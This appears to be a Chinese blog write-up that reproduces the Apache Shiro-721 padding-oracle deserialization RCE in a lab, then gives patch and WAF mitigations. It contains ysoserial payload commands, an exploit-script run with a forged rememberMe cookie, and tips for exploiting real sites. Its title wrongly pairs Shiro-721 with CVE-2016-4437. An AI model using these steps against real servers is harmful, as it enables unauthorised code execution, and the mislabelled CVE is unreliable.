# Apache Shiro 反序列化漏洞（Shiro-721 CVE-2016-4437） - 渗透测试中心 - 博客园

> 原文：[`www.cnblogs.com/backlion/p/14077791.html`](https://www.cnblogs.com/backlion/p/14077791.html)

### 0x00 漏洞介绍

    Apache Shiro 存在高危代码执行漏洞。该漏洞是由于 Apache Shiro cookie 中通过 AES-128-CBC 模式加密的 rememberMe 字段存在问题，用户可通过 Padding Oracle 加密生成的攻击代码来构造恶意的 rememberMe 字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。

### 0x01 影响版本

Apache Shiro 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1 版本。

### 0x02 漏洞指纹

1.set-Cookie: rememberMe=deleteMe
2.URL 中有 shiro 字样
3.有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可

### 0x03  利用技巧

1.该漏洞需要登录后获取到合法的 Cookie: rememberMe=XXX 后才可以进行利用, 看起来不是很好利用 但实际上有一些网站是开放注册的, 而且这个洞不需要知道服务端密钥 所以后续的利用还是可以同 Shiro-550 一样利用, 而且这里是 AES 加密的, 自带过 WAF 属性 ；2.如果攻击没有生效, 可以试一下删除 Cookie 中的 JSESSIONID 字段, 很多时候这个字段存在的话, 服务端不会去处理 rememberMe。

### 0x04 漏洞原理

由于 Apache Shiro cookie 中通过 AES-128-CBC 模式加密的 rememberMe 字段存在问题，用户可通过 Padding Oracle 加密生成的攻击代码来构造恶意的 rememberMe 字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。

### 0x04 环境搭建

**1.利用 docker 搭建环境一：**root@backlion-virtual-machine:/opt# docker pull vulfocus/shiro-cve_2016_4437    root@backlion-virtual-machine:/opt#docker ps root@backlion-virtual-machine:/opt#docker run -d -p 8080:8080 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=192.168.1.14   be60cf0b7704**2.利用 dokcer 搭建环境二：**复现环境: Apache Shiro 1.4.1 + tomcat:8-jre8git 下载 shiro-720 到本地环境

```
git clone [`github.com/3ndz/Shiro-721.git`](https://github.com/3ndz/Shiro-721.git)
```

```
![](img/68ca549247898406beee963e6687744f.png)对 shiro-720 进行编译 cd Shiro-721/Docker
```

```
docker build -t shiro-721 .
```

```
![](img/dfc0160c0caec8ef0ad3e42eed1d89e9.png)启动 dokcer 并将端口 8080 映射到主机端口 8080 上 docker run -p 8080:8080 -d shiro-721 
```

```
![](img/73ac228b511142ba61f4b1b1dc15d555.png)
```

查看是否搭建成功 docker ps  ![](img/49e32dbe3f4349331a5c65d1790e4482.png)**3.通过自行编译 1.4.1war 包放入 tomcat 容器中运行**安装 mavenwget [`downloads.apache.org/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz`](https://downloads.apache.org/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz)![](img/c5f4ec1f54df13d0dcab9864f5f57b1e.png)tar zxvf  apache-maven-3.6.3-bin.tar.gz  -C  /usr/local![](img/860b10559c7a3cfe84dcc15242fdb558.png)vi /etc/profileexport MAVEN_HOME=/usr/local/apache-maven-3.6.3export PATH=$MAVEN_HOME/bin:$PATH ![](img/8b4f17d37a96aa894de3ce4edce91f59.png)source /etc/profilemvn -v ![](img/9039169d10e607682faef7991e56c379.png)vim  /usr/local/apache-maven-3.6.3/conf/settings.xml
找到 mirrors 节点添加阿里镜像库地址：<mirrors>    <mirror>      <id>alimaven</id>      <name>aliyun maven</name>      <url>http://maven.aliyun.com/nexus/content/groups/public/</url>      <mirrorOf>central</mirrorOf>            </mirror>  </mirrors>![](img/e36c4d8a78baa28fe95fd082baa04f9b.png)可从 Apache Shiro Gtihub 官方仓库自行下载漏洞影响版本(https://github.com/apache/shiro)，使用 Apache Maven(软件项目管理及自动构建工具) 编译构建生成 war Java 应用程序包。git clone [`github.com/apache/shiro.git`](https://github.com/apache/shiro.git)![](img/596001a4aa6ab8a5477624146d545e55.png)cd shirogit checkout shiro-root-1.4.1![](img/9788cd6766057448681adf2854790716.png)mvn install 以下几项执行完成以后即可暂停，进而编译 samples/web 下的即可。[INFO] Apache Shiro ....................................... SUCCESS [  1.630 s][INFO] Apache Shiro :: Core ............................... SUCCESS [ 46.175 s][INFO] Apache Shiro :: Web ................................ SUCCESS [  3.571 s]cd samples/webmvn install 将编译完成获取到的 samples-web-1.4.1.war 包( samples/target/中）拷贝到 Tomcat 的 webapps 目录下，启动 tomcat 即可。这里已编号 war 包：https://github.com/backlion/demo/blob/master/samples-web-1.4.1.war 将 war 包拷贝到 docker tomcat 容器中的 webasps 目录下之后打开 http://192.168.1.9:8080/samples-web-1.4.1/![](img/d8c19c497731cb9ba053d159a860a9a4.png)

###   复现步骤：

 1.  输入正确的用户名和密码登录网站（勾选 Remember），并从 cookie 中获取 RememberMe 值。
2.  使用 RememberMe cookie 作为 Padding Oracle Attack 的前缀。
3.  加密 ysoserial 的序列化有效负载，以通过 Padding Oracle Attack 制作精心制作的 RememberMe。
4.  请求带有新的 RememberMe cookie 的网站，以执行反序列化攻击。
5.  攻击者无需知道 RememberMe 加密的密码密钥。 

### 0x05 漏洞复现：

**一.漏洞利用复现 01**

1.登录 Shiro 测试账户获取合法 Cookie（勾选 Remember Me）：

![](img/3db59f0809843ec5ecc726659e32619d.png)

(1) 认证失败时（输入错误的用户名和密码），http 响应页面中会显示出 deleteMe 的 cookie:

![](img/8933f4d4a1fafdb20732439b8e061764.png)

(2) 认证成功（输入正确的用户名和密码登录），http 响应页面中不会显示 deleteMe 的 cookie:

![](img/631c02f3d7f7d1ebf1164738b6257a25.png)

根据以上条件我们的思路是在正常序列化数据（需要一个已知的用户凭证获取正常序列化数据）后利用 Padding Oracle 构造我们自己的数据（Java 序列化数据后的脏数据不影响反序列化结果），此时会有两中情况:

1.  构造的数据不能通过字符填充验证，返回 deleteme;
2.  构造的数据可以成功解密通过字符填充验证，之后数据可以正常反序列化，不返回 deleteme 的 cookie.

2.这里输入正确的用户名和密码，并勾选 Remeber ME。![](img/af5df56878ca88c5744fb34cb48c1323.png)3.登录成功后，访问 http://192.168.1.14:8080/account/，并通过 burp 对其进行抓包，得到 Cookie 中的 rememberMe 值 ![](img/567c204d88642f4b97d9f8b3e12e7a9d.png)4.使用 Java 反序列化工具 ysoserial 生成 Payload:root@kali:/opt# java  -jar ysoserial-master-6eca5bc740-1.jar   CommonsCollections1 'touch /tmp/test' > payload.class  #这里可以生成在目标靶机中创建/tmp/test 的 payload![](img/836908f627f9159e2cdb52570b8dcbbb.png)5.通过 git 对其 padding oracle attack  poc 进行下载 git clone  https://github.com/wuppp/shiro_rce_exp.git![](img/259cd1f00f98072b0fd3609e1c33adb1.png)6. 通过 Padding Oracle Attack 生成 Evil Rememberme cookie:
 > 注意： 此 exp 爆破时间较长，建议使用 ysoserial 生成较短的 payload 验证（如： ping 、 touch /tmp/test 等），约 1 个多小时可生成正确的 rememberme cookie，生成成功后将自动停止运行。 root@kali:/opt# cp payload.class  shiro_rce_exp/root@kali:/opt# cd shiro_rce_exp/root@kali:/opt# python shiro_exp.py http://192.168.1.14:8080/account/  HZ717RwZHZHuR/x9yMmjJUUGWXLAOiZx01rXghAir47/Xbu++kfYFiJA7gQcSn6oaBqcRXfkihooScqykI8FEWlqmN6agAJr3bh5QH+WshypvevVnsEvUDDaSTCEX8tr3seRX8TAJfuNyvK/DD1HHYdgEKZZ9XbbimYH8S7+Xsv0uzx8PH0OuIiFX3HAofmx5y4cvRpYove0NU+/QaRwZV2LoWtAi0adC/vCHb1H2ochg5LBel6jEQakIP3AmYkEOqfRTRl/sm1olkPM+sFk6+lGw9UtDvWqCCqK5fopXV+0n4qCJlyoNyWdVEmm+mZbxekimV3QDdlC75kuyv9Utw9VtOGMdeyBttl8YrXJCJEFEdIN22LxA//iqnyGjltUEljFrZhTXXhml/V8oPVnXFOAmygIaFD6uv9rWnTtPBlLOblusyElga20ngvoMOVKTu3uYHV0Hmiw/gcnT1yT0ZosI2/fe+dzmbVNyGrwKktYjEobCZIIz/U4intWvQ77   payload.class  ![](img/dad0b2dd967dad1d5dcb50cbc4e48fba.png)![](img/bdca2edaf1a4481b6535030aac3208f1.png)rememberMe cookies:Sr3FrVSmz48Tz+k5ZQxUbvAoyEOxk73bEOKUZgvK/W4U8sTEwzhUiU5YwS5HLZb5qe40REONqDBiDxiDz53NCLz7Xz57yorDiuvzRzfosivcjVjhSBfqcRGGRzEoaUGoI7LDb1Cn9pJIz/1xoyL5AcX05T2tfOwpY9u1crUWM28Xh5bY+Us50UQe7mrrDRAhefjETO7VudSkBpf7+KPVmbvPilkMuF153B/YjoAs1qQPDv2bBfS+H9BxILf4vRbhWmVLZnq/mj0t4d3MPhLV6vrtGCp0OjLFvDkPz5MlEk1uAlJjM5YZebvFR2Akei7YI4Xz0pWBs1j7cvq6f5J++ysiPC/lHtWgTY7WLcTTxxJXcGOGPT9N4KZAwpqCjQQbgm4fWGxaci778eWkTWbxqRS7nmfy/UX4P1trwloHdJhB69Pu7qorHUalpDR0YcWbiBc/VuAvOhoutKCW0LjQOjKyJsGj/6nMKTJ98ZG2sG52R5OHp7ELaB7BK+xn4v8e7KNlcCq41VMQyz++qFtDCvSB8kCfgPETF39eEVB4s2ZLwr0OQBViaeszAUIsJjCkaxYADnlt2Sy9wQ8OwSx05VdcuCWjD1q+WjWFePOoQIAxCQiJmHN8G+f609Hj4GlmNYDGsOVIl7J+JWt2ri4HEICHxeflP6e+ALb/UEYGxvRHs11VCNf35usHwyxEFD3VKGFYZ86StRK7czORGSv6jRBjOu3LsWfoHEEElQRQ8CZpSfaPahuKhrkZeVKpQ+14tllU6NtPrM64ytCTr0kXlcLJCAZF8YEy6/iYwFyVVbymNrUoE1nAF3RgzZU8WMvy/yJzFQZm87Lod50r66EC+Y2BANo2rGmo02gQIif/M8SHWXakKp6hnO9iTK37JuSRp4XakH2HubjsfvZtN8KNaAGKIGAxCMRt8w4/duMZHKrKnmoxd9CiGUHjbgj1oP29Fz3OHnqah7sZjHbAw5QZuh+6pgbkb+U9WikFQjISbsJzBm+3MRt0hN2rnbjMvBJmo6Z+FuUZYQNmLo93pDflsYhvYaKcL8Ji3KIcU1v/zC4shbe2WS1CojtV9fNAnJ8rO9cHXC4pfGkbIe1ZLckSS3JWwMtC34X+D+JVuNl6v+03sWvAjCIEoOxL5s0+kqq7QD0B9te7n47UqaAoyH6Ok6O+sTz21zp8W2oDg6iCiWA3njB3ZKp9WhPNgT1qiJcwPcH1mDFJZtMkfBcDFeOQXBr1X253IZImsPC0LkKJZBI2dkgysy0jnLs5gKa9cebfZyJQkRQuFtpa7obu+Fs40ICStzuKoIm7dtZO6Yo6dxRTNWDbZYopt53YcvtSiXVjoi3XR7Qymlm01BHLgzZvF17ANT9H5KXgjfM6Ct6xjFEfHUl+DxevS/GOeSwOzCeoBN5n9UvjopnGoZGrnRw/XaeU+3UpFb+kRI4pr60vm/J9u2KSYrvLSr573vQ7j438J9GSP9yQ0x4XeRKz6PpM4ntaqwPt8gKSPKnVkAeUPb6ocDD1O6lhg3FurZ7WgB3qj90pVzStXRzHDeTkbOCgAZzxOwoH8TuA0TkW3NVSVg1OMAspYhGDiOtFznnOc3ES8D5KzPyThas0eGvrmzPGpWLtK1cfrZEwgmndJFoK3f1rV7Y2FghM56Zl9xhFodS4Cjv9HgzRsBIMtrF57pbftvvBOoBNRvkg2WLMK2+ruzD90dNHypvBTlmyMWFVSeGGWYkeeNgCAzrWF/LpkTSfxCRwe0dhUkFXEYlYksTWZgmWU4haiIifz7+dpm/tME/BZhzbIVRYwraYYydyN34ODw/RJN+LSsL0XRFb0xPWjuIEn4Cselz1XOt/XO0D5G2NZ8vjVBp0mArwp4GtN6ISvgAAAAAAAAAAAAAAAAAAAAA=7.使用 Evil Rememberme cookie 认证进行反序列化攻击：复制该 cookie，然后重放一下数据，即可成功执行命令![](img/8c15868989b1215c5cff33f407c0049c.png) 8.检查一下执行结果，可以看到成功创建了一个 test 文件 root@backlion-virtual-machine:/opt# docker psCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES3f2fb81c0d93        be60cf0b7704        "/usr/local/tomcat/b…"   About an hour ago   Up About an hour    0.0.0.0:8080->8080/tcp   vigilant_williamsonroot@backlion-virtual-machine:/opt# docker exec  -it   3f2fb81c0d93  /bin/bashroot@3f2fb81c0d93:/tmp# ls![](img/1f2830889ebd985493272a171ae84c3d.png)另一种验证方式：[`10.206.14.185:8080/samples-web-1.4.1/account/`](http://10.206.14.185:8080/samples-web-1.4.1/account/)![](img/d60a3b26f8a320acfb4fdce9729e7b34.png)

```
java  -jar ysoserial-master-6eca5bc740-1.jar CommonsBeanutils1 "ping y2xqmm.dnslog.cn" > payload.class   #也可以生成简单 ping dnslog 的地址来测试是否
```

```
![](img/79cd099fe222022517d6cb07a3a96379.png) python shiro_exp.py   [`10.206.14.185:8080/samples-web-1.4.1/account/  `](http://10.206.14.185:8080/samples-web-1.4.1/account/  )  7y9G8wmu+3c94D0kaxohut34n3ldwNnWxmrT9DQDEiSrQ7agYNnci1mh+IYQLmL8cehaMPcnBDclNaEN6eZrPvsEX7eApt5SJEZkmow+ZPsEsnh4wrnHoe7p8RjGVu6P/onx7nrFzZln9d4RC1N8vxEVPUlYZXU7xsMRs35Q8ziFH1EJ1jl/5eiDTn7Wx3yLbHCPyg6v+Qu5ADD+AMbvdHzlLOwY8Pfm5uqEKp36jIwsZjDcQJRhwyUjhAuRyqSUEFKzAq95XUYRaBKKsoxQwN6gD4z7G6lAIBY880CP0QIMhImmbHVfJti/rrnJ/RsxJtoeIH8TujlsEvcCGbJ3Od2XDbhilQUT57XralFArZB7tVCQE9/Vdce96jzR1TjD2rsPbg77eEUXOWbwkYBkJxFBex+p/YrLeJnxm9IvDijGHH2pZp9kCkej7uc8qPm+rH+V3xE0ChIxZXF5l9ScPsvHLJD+gAhgszg75pQnLiS5SOPG73GCj2gFFzzsKnCB  payload.class ![](img/5c1f445f03ef812bcc74d0cc820d7121.png)![](img/1c76717dd4f565133813ee9091a9f5d9.png)![](img/79cad0ba16f7cca910490bc7ecfc6bf0.png)
```

**一.漏洞利用复现 02**

1.登录 Shiro 测试账户获取合法 Cookie（勾选 Remember Me）：

http://192.168.1.14:8080/login.jsp

![](img/3db59f0809843ec5ecc726659e32619d.png)2.打开 burp 并对其进行抓包，Send to Repeater，可以看到成功登录后的 cookie 中的 rememberMe 值![](img/8ae53af231903eb86dc3406012e953b3.png)3.通过 shiro550/721 漏洞检查工具对其进行验证工具下载地址：https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/download/v2.51/ShiroExploit.V2.51.7z![](img/f9c75199f1dda506f70f49ce297738b5.png)![](img/9f943b200e6d7760c69ec4ef748b6f40.png)4.出现“+”证明存在漏洞[`10.206.14.185:8080/samples-web-1.4.1/login.jsp`](http://10.206.14.185:8080/samples-web-1.4.1/login.jsp)![](img/ced7955e31c73056741d2a415066e42b.png)

##  0x06 修复方式

 1.更新版本 Apache Shior 到最新版本：

1.  升级至安全版本
2.  关闭 rememberMe 持久化登录功能。

2\. 临时防范建议：
 在安全设备尝试拦截爆破流量，及时阻止攻击者进行尝试性攻击。    a. 升级 Shiro 到最新版    b.升级对应 JDK 版本到 8u191/7u201/6u211/11.0.1 以上    c.WAF 拦截 Cookie 中长度过大的 rememberMe 值    d.WAF 拦截访问过于频繁的 IP, 因为该漏洞需要爆破 Cookie